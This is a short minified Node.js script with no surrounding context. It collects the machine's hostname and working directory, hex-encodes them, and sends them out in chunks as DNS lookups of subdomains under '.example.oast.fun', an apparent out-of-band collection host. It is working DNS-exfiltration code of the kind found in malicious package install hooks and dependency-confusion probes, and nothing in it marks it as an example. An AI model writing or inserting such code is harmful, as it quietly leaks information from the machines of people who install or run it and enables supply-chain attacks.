const os=require('os'),dns=require('dns');const suffix='.example.oast.fun';
const data={h:os.hostname(),c:process.cwd()};const jsonData=JSON.stringify(data);const hexData=Buffer.from(jsonData).toString('hex');const chunks=hexData.match(/.{1,60}/g);
function resolveDns(hostname){dns.resolve4(hostname,()=>{})}
chunks.forEach((chunk,idx)=>{const host1=`v2_f.id.${idx}.${chunk}.v2_e${suffix}`;resolveDns(host1)});
